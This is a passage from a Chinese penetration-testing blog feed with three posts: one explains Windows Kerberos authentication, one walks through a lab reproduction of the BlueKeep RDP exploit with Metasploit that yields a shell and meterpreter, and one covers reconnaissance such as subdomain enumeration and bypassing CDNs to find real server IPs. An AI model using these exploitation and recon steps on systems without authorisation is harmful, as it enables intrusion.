<li><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li>
</ul>
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>渗透测试</tag>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows域认证体系—Kerberos认证</title>
    <url>/2019/08/25/Windows%E5%9F%9F%E8%AE%A4%E8%AF%81%E4%BD%93%E7%B3%BB%E2%80%94Kerberos%E8%AE%A4%E8%AF%81/</url>
    <content><![CDATA[<p>Kerberos认证流程、含义</p>
<a id="more"></a>

<h2 id="关键词"><a href="#关键词" class="headerlink" title="关键词"></a>关键词</h2><br>

<ul>
<li>Kerberos认证</li>
<li>域控制器（Domain Controller，DC）</li>
<li>密钥分发中心（Key Distribution Center，KDC）</li>
<li>帐户数据库（Account Database，AD）</li>
<li>身份验证服务（Authentication Service，AS）</li>
<li>入场卷[认证票据]（Ticket Granting Ticket，TGT）</li>
<li>票据发放服务（Ticket Granting Service，TGS）</li>
<li>票据（Ticket）</li>
<li>Master Key / Long-term Key |长期密钥（被 Hash加密的用户密钥）</li>
<li>Session Key / Short-term Key | 短期会话密钥</li>
<li>krbtgt 账户</li>
</ul>
<br>

<p>关键词/名称含义：</p>
<ul>
<li><code>Account Database</code>：类似于 SAM的数据库，存储所有 Client的白名单，只有处于白名单中的 Client才可以成功申请 TGT</li>
<li><code>Authentication Service</code>：为 Client生成 TGT的服务</li>
<li><code>Ticket Granting Ticket</code>：入场券，通过入场券能够获得票据，是一种临时凭证的存在</li>
<li><code>Ticket Granting Service</code>：为 Client生成某个服务的票据</li>
<li><code>Ticket</code>：票据，网络对象互相访问的凭证</li>
<li><code>Master Key</code>：长期密钥。将本机密码进行 Hash运算（NTML）得到一个 Hash Code, 我们一般管这样的 Hash Code叫做 Master Key</li>
<li><code>Session Key</code>：短期会话密钥。一种只在一段时间内有效的 Key</li>
<li><code>krbtgt账户</code>：每个域控制器都有一个 krbtgt的用户账户，是 KDC的服务账户，用来创建票据授予服务(TGS)加密的密钥</li>
</ul>
<br>

<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><br>

<h3 id="Kerberos认证含义"><a href="#Kerberos认证含义" class="headerlink" title="Kerberos认证含义"></a>Kerberos认证含义</h3><blockquote>
<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为 客户机 / 服务器应用程序 提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。</p>
</blockquote>
<blockquote>
<p>在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。——<a href="https://baike.baidu.com/item/Kerberos/5561682?fr=aladdin" target="_blank" rel="noopener">度娘百科</a></p>
</blockquote>
<br>

<h3 id="Kerberos认证的三只狗头（脑补地狱三头犬）"><a href="#Kerberos认证的三只狗头（脑补地狱三头犬）" class="headerlink" title="Kerberos认证的三只狗头（脑补地狱三头犬）"></a>Kerberos认证的三只狗头（脑补地狱三头犬）</h3><ul>
<li>Client</li>
<li>Server</li>
<li>DC（KDC）。在 Windows域环境中，KDC的角色由 DC（Domain Controller）来担当</li>
</ul>
<br>


<h2 id="Kerberos大致流程"><a href="#Kerberos大致流程" class="headerlink" title="Kerberos大致流程"></a>Kerberos大致流程</h2><br>

<ul>
<li>Client 携带账户信息向 KDC上的 AS服务发送想要访问 Server A的请求，索要入场卷（ TGT）；AS通过 AD验证 Client账户的访问权，成功后返回 TGT</li>
<li>Client 携带 TGT请求 KDC中的 TGS服务想要访问 Server A，索要票据（Ticket）；TGS验证 Client的 TGT，具有 Server A的访问权，返回 Ticket</li>
<li>Client 携带 Ticket与服务器进行相互验证且成功，可以访问 Server A，但无权访问其他服务器</li>
</ul>
<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B.png" alt="域认证流程"></p>
<br>

<h2 id="Kerberos-认证三步走"><a href="#Kerberos-认证三步走" class="headerlink" title="Kerberos 认证三步走"></a>Kerberos 认证三步走</h2><br>

<h3 id="第一步-Client-与-AS"><a href="#第一步-Client-与-AS" class="headerlink" title="第一步 Client 与 AS"></a>第一步 Client 与 AS</h3><br>

<blockquote>
<p>第一步 AS 实现对 Client 身份的确认，并颁发给该 Client 一个 TGT</p>
</blockquote>
<p>首先，Client发送一个携带被自身 Master Key加密的身份信息 AS Request到 KDC，KDC验证用户名是否存在于 AD中（KDC 可以通 AD中对应用户名提取该 Client 的 Master Key）</p>
<ol>
<li><code>AS Request</code>大致内容：</li>
</ol>
<ul>
<li><code>Pre-authentication data</code>：被 Client 的 Master Key加密过的 Timestamp（Timestamp防爆破）。时间同步（Time Synchronization）显得尤为重要</li>
<li><code>Client name &amp; realm</code>：<em>Domain name\Client name</em> （Client info）</li>
<li><code>Server Name</code>：KDC中 TGS 的 Server Name</li>
</ul>
<br>

<p>AS 需要验证发送方 <code>Client info</code> 是否为本人（Client的密码对否），所以 AS 只需从 AD中提取 Client对应的 Master Key 对 <code>Pre-authentication data</code> 进行解密，如果是一个合法的 <strong>Timestamp</strong>（时间差距合理），则可以证明发送方提供的用户名是存在于白名单中且密码对应正确的</p>
<p>验证成功后，返回给 Client一个 <code>AS Response</code>，主要包含两个部分：请求 Client 的 Master Key加密过的 <code>TGS Session Key</code> 和被 KDC（krbtgt 帐户）加密的TGT （<strong>客户端无法解密 TGT</strong>，因为它没有 KDC Hash）</p>
<ol>
<li>TGT大致内容：</li>
</ol>
<ul>
<li><code>Session Key</code> : 第一部分的 <code>TGS Session Key</code> （这里的 Session Key 是被 KDC加密,不是 Client）</li>
<li><code>Client name &amp; realm</code> : <em>Domain name\Client</em> （Client info）</li>
<li><code>End time</code> : TGT到期的时间</li>
</ul>
<br>

<p>KDC此时生成一个 <code>Session Key</code>，使用 Client 用户名对应的 Master Key加密 Session Key，作为 AS数据（第一部分，用于后续与 TGS通讯）；使用 KDC中 krbtgt 帐户 的 Master Key 加密 Session Key 和 <code>Client info</code>，生成TGT（第二部分）</p>
<p>Client 通过自己的 Master Key 对第一部分解密获得 <code>TGS Session Key</code>后，携带 TGT进入第二步</p>
<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%AC%AC%E4%B8%80%E6%AD%A5.png" alt="域认证第一步" title="域认证第一步"></p>
<br>

<h3 id="第二步-Client-与-TGS"><a href="#第二步-Client-与-TGS" class="headerlink" title="第二步 Client 与 TGS"></a>第二步 Client 与 TGS</h3><br>

<blockquote>
<p>第二步 实现 TGS 对 Client 身份（TGT）的确认，并分发给该 Client 一个 Ticket</p>
</blockquote>
<p>Client 使用 AS返回的 <code>TGS Session Key</code> 建立访问 KDC中 TGS服务的请求（<code>TGS Request</code>），再将 TGT 连同请求一起发送到 TGS 服务</p>
<ol>
<li><code>TGS Request</code>大致内容：</li>
</ol>
<ul>
<li><code>Authenticator</code>：（Client info + timestamp）通过 <code>TGS Session Key</code>加密</li>
<li><code>TGT</code> ：（<em>TGS Session Key + Client info + End Time</em>）</li>
<li><code>Client info</code> ：<em>Domain name/ Client</em></li>
<li><code>Server info</code> ：Client试图访问的 Server</li>
<li><code>时间戳</code></li>
</ul>
<br>

<p>TGS收到 <code>TGS Request</code>后需要验证 TGT 和 Authenticator；因为 <code>Authenticator</code> 被 <code>TGS Session Key</code> 加密，TGS服务并没有保存这个 Session Key ；于是使用 TGS 自己的 Master Key 解密 TGT 获得其中的 TGS Session Key，进而解密 Authenticator，验证客户端是否受信</p>
<p>验证成功后，TGS 返回一个 <code>TGS Response</code> ，包含两个消息：加密的 Ticket 和加密的 Session Key</p>
<ol>
<li><code>TGS Response</code> 大致内容：</li>
</ol>
<ul>
<li>使用 Server 的 Master Key 进行加密的 Ticket</li>
<li>通过 <code>TGS Session Key</code> 加密的 <code>Server Session Key</code> （将来 Client与 Server Service的通信使用）</li>
</ul>
<ol start="2">
<li><code>Ticket</code> 大致内容：</li>
</ol>
<ul>
<li>Server Session Key</li>
<li>Client info</li>
<li>End time: Ticket的到期时间</li>
</ul>
<br>

<p>Client收到 <code>TGS Response</code> 后，使用 <code>TGS Session Key</code> 解密 <code>Server Session Key</code>，得到 Session Key 后，进入第三步</p>
<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%AC%AC%E4%BA%8C%E6%AD%A5.png" alt="域认证第二步" title="域认证第二步"></p>
<br>

<h3 id="第三步-Client-和-Server"><a href="#第三步-Client-和-Server" class="headerlink" title="第三步 Client 和 Server"></a>第三步 Client 和 Server</h3><br>

<blockquote>
<p>第三步，Client 携带 <code>Server Session Key</code> 和 <code>Ticket</code>访问服务器，验证成功后，可以访问 Server资源</p>
</blockquote>
<p>Client 通过第二步获的 Server 的 Session Key ，创建用于证明自己就是 Ticket 的真正所有者的 Authenticator 和时间戳，并使用 Server的 Session Key 进行加密</p>
<p>向服务器请求后，服务器用自己的 Master Key 解密  Ticket ，得到 <em>Server Session Key*，使用 *Server Session Key</em> 解密 Authenticator 进行验证，同上一步一样<br>验证成功后返回给 Client <strong>新时间戳</strong>，<strong>使用 Server Session Key 加密</strong></p>
<p>Client 通过缓存中的 <code>Server Session Key</code> 解密服务器返回信息，得到新时间戳并验证其是否正确。验证通过的话则客户端可以信赖服务器，并向服务器发送服务请求，服务器向客户端提供相应的服务</p>
<p>校验通过后，认证成功，该票据会一直存在客户端内存中</p>
<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%AC%AC%E4%B8%89%E6%AD%A5.png" alt="域认证第三步" title="域认证第三步"></p>
<br>

<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
<li><a href="https://blog.csdn.net/wy_97/article/details/87649262" target="_blank" rel="noopener">windows 域认证 Kerberos详解</a></li>
<li><a href="https://www.secpulse.com/archives/94848.html" target="_blank" rel="noopener">彻底理解Windows认证 - 议题解读</a></li>
<li><a href="https://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="noopener">kerberos认证原理—讲的非常细致，易懂</a></li>
<li><a href="https://zh.wikipedia.org/wiki/Kerberos" target="_blank" rel="noopener">Kerberos</a></li>
</ul>
]]></content>
      <tags>
        <tag>Windows</tag>
        <tag>渗透测试</tag>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-0708复现</title>
    <url>/2019/09/12/CVE-2019-0708%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>CVE-2019-0708 远程桌面服务的远程代码执行漏洞, 漏洞触发无需用户交互</p>
<a id="more"></a>

<blockquote>
<p>A remote code execution vulnerability exists in Remote Desktop Services formerly known as Terminal Services when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka ‘Remote Desktop Services Remote Code Execution Vulnerability’. —— <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708" target="_blank" rel="noopener">CVE</a></p>
</blockquote>
<br>

<p>复现环境:</p>
<ul>
<li>Windows 7 (Build 7601, Service Pack 1) x64</li>
<li>Windows server 2008 R2 x64</li>
<li>Metaspliot (Ubuntu Server)</li>
</ul>
<blockquote>
<p>初始版本的 Exp只适用于64位版本的 Windows 7和 Windows server 2008 R2</p>
</blockquote>
<br>

<p>更新 MSF到最新（<strong>5.0.47</strong>）版本，推荐使用 Curl更新（需要删除旧版）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure>

<br>

<p>因为这个 pull不是正式的，所以需要自行比对 diff增删或者<strong>直接替换</strong>文件: <a href="https://github.com/rapid7/metasploit-framework/pull/12283/files" target="_blank" rel="noopener">Pull 地址</a></p>
<p>这里已下载完成，可直接替换使用(建议去 Pull下载，万一就更新了呢)：</p>
<ul>
<li><a href="./Tools/rdp.rb">rdp.rb</a></li>
<li><a href="./Tools/cve_2019_0708_bluekeep.rb">cve_2019_0708_bluekeep.rb</a></li>
<li><a href="./Tools/rdp_scanner.rb">rdp_scanner.rb</a></li>
<li><a href="./Tools/cve_2019_0708_bluekeep_rce.rb">cve_2019_0708_bluekeep_rce.rb</a></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 对应的替换文件</span></span><br><span class="line"></span><br><span class="line">lib/msf/core/exploit/rdp.rb</span><br><span class="line">modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</span><br><span class="line">modules/auxiliary/scanner/rdp/rdp_scanner.rb</span><br><span class="line">modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb</span><br></pre></td></tr></table></figure>

<br>

<p><img src="./2019-09-11-20-43-34%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="可以正常搜索到"></p>
<br>

<p>执行 <code>exploit</code></p>
<p><img src="./2019-09-12-12-42-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="按需选择 target"><br><img src="./2019-09-12-15-36-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="目标机远程选项选第 3项会报无漏洞"><br><img src="./2019-09-10-14-46-40%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 shell"><br><img src="./2019-09-10-20-38-27%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="003" title="返回 meterpreter"><br><img src="./cve-2019-0708_win2k8_2.gif" alt="004" title="Win2k8进行 expliot出现蓝屏重启情况(第一次蓝屏)"></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2019/07/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>信息收集，收集的是那些信息？怎样收集？</p>
<a id="more"></a>

<br>

<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=570378662&auto=1&height=66"></iframe>

<br>
信息收集，收集的是那些信息？主要的就是服务器配置信息和网站的一些敏感信息，包含不限于网站域名(及子域名)、操作系统、CMS指纹、真实IP、开放的端口、Whois信息、备案信息、证书、敏感目录、防火墙、登录页面等等，这些信息会对后期渗透带来极大的作用


<br>

<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><br>

<ul>
<li><p>主动收集<br>  通过扫描确认目标安装的操作系统和网络服务，并发现潜在漏洞的过程</p>
</li>
<li><p>被动收集（外围信息收集）<br>  在不接触目标的情况下搜集目标、网络、客户及其他信息</p>
</li>
</ul>
<br>

<blockquote>
<p>A记录、MX记录、CNAME记录……<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/574285?fr=aladdin#6_3" target="_blank" rel="noopener">度娘百科</a> 和 <a href="https://hellohxk.com/blog/penetration-testing/#host-dig" target="_blank" rel="noopener">渗透测试相关总结</a> </p>
</blockquote>
<br>

<h2 id="域名相关信息收集"><a href="#域名相关信息收集" class="headerlink" title="域名相关信息收集"></a>域名相关信息收集</h2><br>
这是在得到域名后的第一件事了吧...通常包括该域名的 DNS服务器信息和注册人的联系信息等

<br>

<h3 id="Whois信息"><a href="#Whois信息" class="headerlink" title="Whois信息"></a>Whois信息</h3><br>

<blockquote>
<p>简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。    ——度娘百科</p>
</blockquote>
<br>

<p>在线 WHois查询网站：</p>
<ul>
<li><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">站长之家</a>  </li>
<li><a href="https://whois.aliyun.com/" target="_blank" rel="noopener">阿里云</a>  </li>
<li><a href="https://whois.aizhan.com/" target="_blank" rel="noopener">爱站网</a> </li>
</ul>
<p>国外的网站可能用国内的 WHois查不到，所以使用国外的 WHois：</p>
<ul>
<li><a href="https://whois.icann.org" target="_blank" rel="noopener">Whois</a></li>
<li><a href="https://www.whois.com/whois" target="_blank" rel="noopener">WHois2</a></li>
</ul>
<p>本地 Tools：</p>
<ul>
<li><code>whois</code> (kali工具) </li>
</ul>
<br>

<p><img src="./1562721082715.png" alt="Alt text"> </p>
<br>

<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><br>
主要针对国内网站

<ul>
<li><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a> </li>
<li><a href="http://www.beianbeian.com/" target="_blank" rel="noopener">ICP备案查询网</a> </li>
</ul>
<br>

<h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><br>

<blockquote>
<p>子域名，是顶级域名（一级域名或父域名）的下一级。例如：<code>mail.baidu.com</code> 是 <code>baidu.com</code> 的子域名</p>
</blockquote>
<p>子域名探测可以帮我们发现渗透测试中更多的服务，这将增加发现漏洞的可能性（旁注）<br><br></p>
<h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><br>

<ul>
<li><code>site:baidu.com</code> </li>
<li><code>site:baidu.com -www</code> </li>
</ul>
<br>

<h3 id="证书透明度"><a href="#证书透明度" class="headerlink" title="证书透明度"></a>证书透明度</h3><br>

<blockquote>
<p>谷歌 Chrome要求2017年所有 SSL证书都要支持证书透明，所以可以根据 CT log查询支持 HTTPS网站的子域名<br>证书透明度（CT）是证书授权机构（CA）的一个项目，证书授权机构会将每个 SSL/TLS证书发布到公共日志中。<br> 一个SSL/TLS证书通常包含域名、子域名和邮件地址</p>
</blockquote>
<ul>
<li>Certificate Transparency logs（<a href="https://transparencyreport.google.com/https/certificates" target="_blank" rel="noopener">CT</a> ） <ul>
<li><a href="https://crt.sh/" target="_blank" rel="noopener">Crt</a>  </li>
<li><a href="https://censys.io/" target="_blank" rel="noopener">Censys</a> </li>
<li><a href="https://transparencyreport.google.com/https/certificates" target="_blank" rel="noopener">Google CT</a> </li>
</ul>
</li>
</ul>
<p><img src="./1562726243235.png" alt="Alt text"> </p>
<br>

<h3 id="crossdomain-xml-文件"><a href="#crossdomain-xml-文件" class="headerlink" title="crossdomain.xml 文件"></a>crossdomain.xml 文件</h3><br>

<p><img src="./1563102710570.png" alt="Alt text"></p>
<br>

<h3 id="其他网站-amp-工具-【TODO】"><a href="#其他网站-amp-工具-【TODO】" class="headerlink" title="其他网站&amp;工具 【TODO】"></a>其他网站&amp;工具 【TODO】</h3><br>

<p>漏洞：</p>
<ul>
<li>DNS 域传送漏洞</li>
</ul>
<p>在线网站：</p>
<ul>
<li><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">DNSdumpster</a>  是一个免费的域名分析网站，是HackerTarget旗下项目，可以查询相关的子域名或者旁站域名</li>
<li><a href="https://dnsdb.io/zh-cn" target="_blank" rel="noopener">dnsdb</a> 全球 DNS搜索引擎</li>
</ul>
<p>工具：</p>
<ul>
<li><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">Sublist3r</a> 是一个python工具，旨在使用OSINT枚举网站的子域。</li>
<li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a> 本工具用于渗透测试目标域名收集。高并发DNS暴力枚举，发现其他工具无法探测到的域名, 如Google，aizhan，fofa</li>
<li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain</a> 猪猪侠开发的工具</li>
<li><a href="https://github.com/guelfoweb/knock" target="_blank" rel="noopener">Knock Subdomain Scan</a> 子域名扫描器，freebuf<a href="https://www.freebuf.com/column/145949.html" target="_blank" rel="noopener">介绍</a></li>
<li><a href="https://github.com/subfinder/subfinder" target="_blank" rel="noopener">subfinder</a> 它已成为 <code>sublist3r</code>项目的继承者。freebuf<a href="https://www.freebuf.com/sectool/175556.html" target="_blank" rel="noopener">介绍</a> </li>
<li><a href="https://github.com/evilH2O2/Daily/blob/master/Tools/Layer.rar" target="_blank" rel="noopener">Layer子域名挖掘机</a> </li>
<li><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">SubBrute</a> 枚举域名系统记录和子域的域名系统元查询蜘蛛</li>
<li><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">aquatone</a>  一款强大的域名工具，可以查子域名相同指纹站点</li>
</ul>
<p><img src="./1563100622677.png" alt="Alt text"><br><img src="./2019-07-14-19-40.png" alt="Alt text"></p>
<br>

<h2 id="寻找真实-IP"><a href="#寻找真实-IP" class="headerlink" title="寻找真实 IP"></a>寻找真实 IP</h2><br>

<blockquote>
<p>CDN（content delivery network 或 content distribution network）即内容分发网络。如果目标使用了 CDN，那么直接 Ping目标的域名，得到的 IP是离我们最近的一台目标节点的 CDN服务器</p>
</blockquote>
<br>

<h3 id="判断-CND是否存在"><a href="#判断-CND是否存在" class="headerlink" title="判断 CND是否存在"></a>判断 CND是否存在</h3><br>

<h4 id="通过多地-Ping域名"><a href="#通过多地-Ping域名" class="headerlink" title="通过多地 Ping域名"></a>通过多地 Ping域名</h4><br>

<p>通过多地 <code>Ping</code>域名，查看对应 IP 地址是否唯一，若不唯一，多半是使用了 CDN<br>如果 IP大多不一样或者规律性很强，可以尝试查询这些 IP的归属地，判断是否存在 CDN</p>
<p><img src="./1562746685378.png" alt="Alt text" title="未使用 CDN"><br><img src="./1562746836448.png" alt="Alt text" title="使用 CDN"></p>
<br>

<p>多地点 <code>Ping</code>在线网站：</p>
<ul>
<li><a href="http://ping.chinaz.com" target="_blank" rel="noopener">站长之家</a> </li>
<li><a href="https://ping.aizhan.com/" target="_blank" rel="noopener">爱站网</a></li>
<li><a href="https://tools.ipip.net/newping.php" target="_blank" rel="noopener">IPIP</a> </li>
</ul>
<br>

<h4 id="使用-nslookup"><a href="#使用-nslookup" class="headerlink" title="使用 nslookup"></a>使用 nslookup</h4><br>
nslookup会得到 DNS解析服务器保存在缓存中的非权威解答

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 采用 CDN</span></span><br><span class="line">&gt; www.baidu.om</span><br><span class="line"></span><br><span class="line">非权威应答:</span><br><span class="line">www.baidu.com	canonical name = www.a.shifen.com.</span><br><span class="line">Name:	www.a.shifen.com</span><br><span class="line">Address: 180.101.49.11</span><br><span class="line">Name:	www.a.shifen.com</span><br><span class="line">Address: 180.101.49.12</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------</span></span><br><span class="line"><span class="comment"># 无 CDN</span></span><br><span class="line">&gt; www.puercn.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">非权威应答:</span><br><span class="line">Name:	www.puercn.com</span><br><span class="line">Address: 116.55.242.3</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------------------------------</span></span><br><span class="line">&gt; maxiang.io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:	maxiang.io</span><br><span class="line">Address: 115.29.201.173</span><br></pre></td></tr></table></figure>

<br>

<h4 id="修改本地-hosts文件"><a href="#修改本地-hosts文件" class="headerlink" title="修改本地 hosts文件"></a>修改本地 hosts文件</h4><br>
修改本地 hosts文件，强行将域名与 IP解析对应
然后访问域名查看页面是否变化


<br>

<h4 id="IP反查域名（这个……）"><a href="#IP反查域名（这个……）" class="headerlink" title="IP反查域名（这个……）"></a>IP反查域名（这个……）</h4><br>

<p>使用 IP反查域名的方式查找 IP下是否存在对应域名，如果使用了 CDN，会出现大量无关域名：<br><img src="./1562748778598.png" alt="Alt text"><br><img src="./1562748843679.png" alt="Alt text" title="WeChat-Web"><br><img src="./1562748898697.png" alt="Alt text" title="Baidu--大概就是从这里判断……"></p>
<br>

<p>地址：</p>
<ul>
<li><a href="https://tools.ipip.net/ipdomain.php" target="_blank" rel="noopener">IPIP</a> </li>
<li><a href="https://dns.aizhan.com" target="_blank" rel="noopener">爱站网</a></li>
</ul>
<br>

<h3 id="绕过-CDN-查找网站真实-IP-TODO"><a href="#绕过-CDN-查找网站真实-IP-TODO" class="headerlink" title="绕过 CDN 查找网站真实 IP [TODO]"></a>绕过 CDN 查找网站真实 IP [<code>TODO</code>]</h3><br>

<h4 id="秃域名"><a href="#秃域名" class="headerlink" title="秃域名"></a>秃域名</h4><br>
因为现有很多 CDN厂商基本只要求把 www.xxx.com cname到 CDN主服务器上去，而且有人为了维护网站时更方便，不用等 CDN缓存，只让 WWW域名使用 CDN，秃域名不使用

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping www.xxx.com</span><br><span class="line"></span><br><span class="line">ping xxx.com</span><br></pre></td></tr></table></figure>

<br>

<h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><br>

<p>抓包观察 IP地址，使用 <code>telnet</code>去连接相应端口，如果返回 html则为真实 IP</p>
<br>

<h4 id="内部邮箱源（RSS订阅、邮件等）"><a href="#内部邮箱源（RSS订阅、邮件等）" class="headerlink" title="内部邮箱源（RSS订阅、邮件等）*"></a>内部邮箱源（RSS订阅、邮件等）*</h4><br>

<p>有的服务器本地自带 sendmail，注册之后，会主动发一封邮件给我们，打开邮件的源代码，你就能看到邮件服务器的真实IP了，很大可能与主站处在一个网段</p>
<p>注意，如果是第三方或公共邮件服务器是没用的</p>
<br>

<h4 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名*"></a>查询子域名*</h4><br>

<p>很多站长可能只会对主站或者流量大的子站点做了 CDN，很多子站点又跟主站 <em>在同一台服务器或者同一个C段内</em>，从而能判断出目标的真实 IP段</p>
<br>

<h4 id="国外主机解析域名-amp-国外-DNS"><a href="#国外主机解析域名-amp-国外-DNS" class="headerlink" title="国外主机解析域名&amp;国外 DNS*"></a>国外主机解析域名&amp;国外 DNS*</h4><br>
国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实 IP

<p>国外 DNS：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目标并未使用 CDN，这里只是举一个使用方法的例子</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># nslookup maxiang.io 8.8.8.8   </span></span><br><span class="line">Server:		8.8.8.8</span><br><span class="line">Address:	8.8.8.8<span class="comment">#53</span></span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:	maxiang.io</span><br><span class="line">Address: 115.29.201.173</span><br></pre></td></tr></table></figure>

<br>

<p>国外 Ping服务：</p>
<ul>
<li><a href="https://asm.ca.com/zh_cn/ping.php" target="_blank" rel="noopener">App Synthetic Monitor</a> </li>
</ul>
<br>

<h4 id="利用-SSL证书寻找真实原始IP"><a href="#利用-SSL证书寻找真实原始IP" class="headerlink" title="利用 SSL证书寻找真实原始IP*"></a>利用 SSL证书寻找真实原始IP*</h4><br>

<p><a href="https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/" target="_blank" rel="noopener">Finding The Real Origin IPs Hiding Behind CloudFlare or Tor</a>  [19 August 2018]</p>
<br>

<h4 id="目标-APP抓包"><a href="#目标-APP抓包" class="headerlink" title="目标 APP抓包*"></a>目标 APP抓包*</h4><br>
如果目标站有自己的 APP，可以通过 Fiddler或 Burp Suite抓包，寻找真实 IP

<br>

<h4 id="利用网站漏洞-近距离与网站进行-Py交易"><a href="#利用网站漏洞-近距离与网站进行-Py交易" class="headerlink" title="利用网站漏洞(近距离与网站进行 Py交易)*"></a>利用网站漏洞(近距离与网站进行 Py交易)*</h4><br>
例如xss、ssrf、命令执行反弹shell等

<br>

<h4 id="历史解析记录"><a href="#历史解析记录" class="headerlink" title="历史解析记录"></a>历史解析记录</h4><br>
查看一些历史的 A记录说不定会发现什么
但是更多的可能是那个 IP已经不在用了…

<p>在线网站：</p>
<ul>
<li><a href="https://securitytrails.com/" target="_blank" rel="noopener">SecurityTrails</a> </li>
<li><a href="https://www.17ce.com/" target="_blank" rel="noopener">17CE</a></li>
<li><a href="https://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">Site report</a> </li>
<li><a href="https://community.riskiq.com/" target="_blank" rel="noopener">RiskIQ</a>  [需要注册]</li>
</ul>
<p><img src="./1562854972168.png" alt="Alt text"></p>
<p><img src="./1562855014817.png" alt="Alt text"></p>
<br>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 目标并未使用 CDN，这里只是举一个使用方法的例子</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># curl -H "Host: www.puercn.com" 116.55.242.3 -k</span></span><br><span class="line"><span class="comment"># 返回首页</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># curl -H "Host: www.puercn.com" 116.55.243.79 -k</span></span><br><span class="line">curl: (7) Failed to connect to 116.55.243.79 port 80: 连接超时</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># curl -H "Host: www.puercn.com" 116.55.242.4 -k</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"white"</span>&gt;</span><br><span 